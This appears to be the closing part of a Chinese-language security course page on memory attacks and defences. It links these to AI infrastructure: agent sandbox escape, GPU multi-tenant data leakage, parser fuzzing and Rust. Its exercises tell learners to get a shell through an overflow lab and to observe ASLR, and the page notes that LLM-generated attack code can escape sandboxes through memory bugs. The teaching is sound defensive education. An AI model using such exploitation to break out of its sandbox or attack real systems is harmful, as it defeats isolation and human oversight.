+<p><strong>2. Agent 沙箱逃逸的最后一跳往往是内存漏洞。</strong> 你为 code-interpreter 类工具设计的沙箱（容器 / gVisor / WASM），隔离的是「正常代码」。但如果沙箱内核、容器 runtime、或 WASM runtime 自身有内存漏洞（比如 runc 的 CVE、V8 的 UAF），LLM 生成的攻击代码就能从沙箱逃到宿主。理解 ROP/堆利用，你才能评估「我的沙箱边界到底有多硬」，而不是盲目相信「跑在容器里就安全」。</p>
+
+<p><strong>3. GPU 显存的「数据即代码」风险。</strong> 今天讲的是 CPU 侧「数据被当代码执行」。GPU 上也有类似面：共享的 CUDA context、显存未清零导致的跨租户数据残留（Day 34/48 会深入）、以及 GPU kernel 里的越界写。多租户推理服务里，一个租户的越界访问可能读到另一个租户的 KV cache——这是「内存隔离」在 GPU 上的延伸。</p>
+
+<p><strong>4. 用 fuzzing 测你的 Agent 输入解析层。</strong> Agent 系统有大量「解析不可信输入」的地方：工具返回的 JSON、检索到的文档、多模态输入的图片/音频解码。这些解析器（尤其调用 C 库的部分，如图片解码 libjpeg/libpng）都是内存漏洞高发区。把今天的 AFL++/libFuzzer + ASan 组合用到这些解析路径上，是主动发现问题的正确姿势——就像 OSS-Fuzz 对开源库做的那样。</p>
+
+<p><strong>5. 内存安全语言是 AI 基础设施的长期方向。</strong> 微软 70% CVE 是内存问题这个数据，同样适用于 AI 基础设施。越来越多的 AI infra 组件在用 Rust 重写（比如 HuggingFace 的 tokenizers、candle 推理框架、部分向量数据库）。理解 Rust 的所有权模型，不只是学门语言——是理解「为什么这些新组件从设计上就更难被内存攻击打穿」，从而在选型时把内存安全作为一个真实的安全指标。</p>
+</div>
+
+<h2 id="exercise">📝 今日小练习</h2>
+
+<div class="exercise">
+<p><span class="exercise-num">1</span><strong>动手</strong>：完整跑通 Lab 1→3，用你自己算的偏移拿到 shell。然后回到 Lab 4 编译带全防护的版本，用 <code>checksec</code> 对比两个二进制的保护位差异，把 <code>*** stack smashing detected ***</code> 的输出截下来，写一句话解释是哪道防线拦住了你。</p>
+</div>
+
+<div class="exercise">
+<p><span class="exercise-num">2</span><strong>观察</strong>：对一个系统自带的二进制（如 <code>/bin/ls</code>）跑 <code>checksec /bin/ls</code>，看它开了哪些防护。再运行两次同一个程序，分别 <code>cat /proc/&lt;pid&gt;/maps | grep libc</code>，对比两次 libc 的加载基址——它们应该不同。这就是 ASLR 在你眼前工作。思考：为什么代码段（如果没开 PIE）两次地址却一样？</p>
+</div>
+
+<div class="exercise">
+<p><span class="exercise-num">3</span><strong>思考</strong>：假设你负责一个 Agent 平台，用户可以上传自定义模型权重文件（GGUF/safetensors）让平台加载推理。请列出 3 个内存安全相关的攻击面，并为每个给出一条对应的防御措施（提示：从「解析器 fuzzing」「进程隔离」「文件格式校验」「用内存安全语言重写解析层」几个角度想）。写成一个小表格。</p>
+</div>
+
+<div class="next">
+<strong>明日预告 · Day 42（周日 🌐 综合）</strong>：<strong>内存视角看 vLLM 的 PagedAttention</strong>。本周我们从内存层级、NUMA、memory-bound 一路讲到今天的内存攻防。明天做周复盘，并把「内存」这个主题收束到你最熟悉的领域——用操作系统的分页思想，看 vLLM 是如何解决传统 KV cache 的内存碎片问题的：block table、preemption、prefix caching。你会发现，PagedAttention 本质上就是把 Day 08 讲的「虚拟内存分页」搬到了 GPU 显存上。届时今天的「内存布局」和明天的「显存分页」会形成一个漂亮的闭环。</div>
+
+<!-- nav-injected v1 -->
+<nav id="page-nav" style="display:flex;justify-content:space-between;align-items:center;margin:48px 0 16px;padding-top:20px;border-top:1px solid #e7e5e0;font-size:14px;font-family:-apple-system,BlinkMacSystemFont,'PingFang SC',sans-serif;"></nav>
+<script>
+(function(){
+  var path = window.location.pathname;
+  var m = path.match(/(day|article)-(\d+)\.html$/i);
+  if (!m) return;
+  var type = m[1].toLowerCase();
+  var n = parseInt(m[2], 10);
+  var isDay = type === 'day';
+  var perWeek = isDay ? 7 : 3;
+  var total = 168, accent='#c2410c', soft='#fed7aa';
+  if (path.indexOf('security-plan') !== -1) { total=154; accent='#b91c1c'; soft='#fecaca'; }
+  if (path.indexOf('posttraining-plan') !== -1) { total=48; accent='#1e40af'; soft='#bfdbfe'; }
+  function urlFor(k){
+    var week = Math.ceil(k/perWeek);
+    return '../week-'+String(week).padStart(2,'0')+'/'+type+'-'+(isDay?String(k).padStart(2,'0'):String(k))+'.html';
+  }
+  var label = isDay ? '天' : '篇';
+  var prefix = isDay ? 'Day' : 'Article';
+  var linkS = 'color:'+accent+';text-decoration:none;padding:8px 18px;border:1px solid '+soft+';border-radius:6px;background:#fff;font-weight:500;';
+  var disS = 'color:#cbd5e1;padding:8px 18px;';
+  var prev = n>1 ? '<a href="'+urlFor(n-1)+'" style="'+linkS+'">← 上一'+label+'（'+prefix+' '+(n-1)+'）</a>' : '<span style="'+disS+'">← 上一'+label+'</span>';
+  var next = n<total ? '<a href="'+urlFor(n+1)+'" style="'+linkS+'">下一'+label+'（'+prefix+' '+(n+1)+'） →</a>' : '<span style="'+disS+'">下一'+label+' →</span>';
+  document.getElementById('page-nav').innerHTML = prev + next;
+})();
+</script>
+
+</body>
+</html>
